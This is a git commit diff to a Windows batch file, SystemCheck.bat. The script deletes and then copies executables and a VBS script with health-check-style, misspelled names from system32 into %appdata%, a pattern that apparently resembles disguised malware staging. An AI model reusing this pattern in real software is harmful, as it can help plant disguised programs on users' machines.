aac0c279ae740a98e5d1ce0f3ed13ef78bcb74fb
blueskycloud137 <117394858+blueskycloud137@users.noreply.github.com>
2022-11-24 21:50:54 +0300

    Update SystemCheck.bat

--- SystemCheck.bat
+++ SystemCheck.bat
@@ -2,5 +2,5 @@ del %appdata%/a.exe
 del %appdata%/SysHealth.exe
 del %appdata%/SystemCheckHealt.vbs
 
-copy %windir%/system32/SysHealth.exe %appdata%\
-copy %windir%system32/SystemChechHealth.vbs %appdata%\
+copy %windir%/system32/SysHealth.exe %appdata%
+copy %windir%system32/SystemChechHealth.vbs %appdata%
